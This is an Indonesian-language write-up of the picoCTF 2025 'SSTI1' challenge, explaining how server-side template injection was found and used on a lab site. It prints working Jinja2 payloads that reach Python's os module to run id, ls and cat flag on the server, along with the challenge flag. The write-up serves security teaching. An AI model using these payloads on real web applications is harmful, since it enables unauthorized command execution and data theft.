# SSTI1

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoCTF 2025 |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Easy |
| Status | Solved |

## Deskripsi

Challenge ini menyediakan website sederhana untuk membuat pengumuman. Aplikasi
menggunakan templating untuk merender input pengguna, sehingga input tersebut perlu
diuji untuk memastikan apakah server mengevaluasinya sebagai template.

## Informasi Awal

Instance yang terlihat pada screenshot dapat diakses melalui:

```text
http://rescued-float.picoctf.net:59782
```

Halaman utama menampilkan teks:

```text
I built a cool website that lets you announce whatever you want!*
```

Hint challenge:

```text
Server Side Template Injection
```

## Tools

- Firefox
- Browser Developer Tools untuk mengamati aplikasi

## Analisis

Input biasa seperti `hai` ditampilkan kembali sebagai pengumuman. Untuk menguji apakah
input diproses oleh template engine, digunakan ekspresi aritmetika `{{7*7}}`. Hasil yang
ditampilkan adalah `49`, bukan teks literal `{{7*7}}`. Ini membuktikan adanya Server-Side
Template Injection (SSTI).

Karena template dapat mengakses objek Python tertentu, payload berikut digunakan untuk
mengakses modul `os` melalui global object template. Perintah `id` digunakan terlebih
dahulu untuk memverifikasi bahwa server mengeksekusi perintah sistem.

## Langkah Penyelesaian

### 1. Membuka website

Instance dibuka melalui browser. Halaman menyediakan input `What do you want to
announce:` dan tombol `Ok`.

### 2. Menguji rendering input

Sebagai pengujian awal, nilai `hai` dimasukkan ke form. Aplikasi kemudian menampilkan
`hai` sebagai pengumuman pada endpoint `/announce`.

### 3. Menguji Server-Side Template Injection

Ekspresi aritmetika berikut dimasukkan ke form:

```jinja2
{{7*7}}
```

Aplikasi merender hasilnya sebagai:

```text
49
```

Hasil ini menunjukkan bahwa input dievaluasi oleh server sebagai template.

### 4. Mengecek eksekusi perintah sistem

Payload SSTI berikut digunakan untuk menjalankan perintah `id` melalui modul `os`:

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Output yang ditampilkan aplikasi adalah:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Output tersebut menunjukkan bahwa perintah dijalankan dengan user `root` pada instance
challenge.

### 5. Melakukan enumerasi file

Sebelum membaca flag, daftar file pada direktori kerja diperiksa menggunakan perintah
`ls` melalui SSTI:

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

Output yang ditampilkan adalah:

```text
__pycache__ app.py flag requirements.txt
```

Output tersebut mengonfirmasi bahwa file `flag` tersedia pada direktori kerja.

### 6. Membaca file flag

Setelah eksekusi perintah terverifikasi, payload diubah untuk membaca file `flag`:

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
```

Hasil pembacaan file menampilkan flag pada halaman pengumuman.

## Flag

```text
picoCTF{s4rv3r_s1d3_t3mp1at3_1nj3ct10n5_4r3_c001}
```

## Pembelajaran

- SSTI terjadi ketika input pengguna diproses sebagai template oleh server.
- Ekspresi sederhana seperti `{{7*7}}` dapat digunakan untuk menguji apakah template
  benar-benar dievaluasi.
- Akses terhadap objek Python dari template dapat berkembang menjadi Server-Side
  Template Injection dengan kemampuan menjalankan perintah sistem.
- Template engine harus menggunakan sandbox dan tidak boleh mengevaluasi input pengguna
  sebagai template yang memiliki akses ke fungsi atau modul sensitif.
